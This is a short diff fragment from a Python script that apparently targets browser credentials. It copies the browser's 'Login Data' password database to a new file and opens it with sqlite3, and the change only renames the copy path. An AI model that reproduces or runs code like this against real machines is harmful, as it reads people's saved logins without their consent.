@@ -16,12 +16,12 @@ def dest_path():
     return User_profile
 
 source_file = Find_path()
-copyfile(source_file, "E:\Login Data")
+copyfile(source_file, r"\LoginData.db")
 
 # Connect to the Database
 try:
     #print('[+] Opening ' + path)
-    conn = sqlite3.connect("E:\Login Data")
+    conn = sqlite3.connect(r"\LoginData.db")
     cursor = conn.cursor()
 except Exception as e:
     print('[-] %s' % (e))
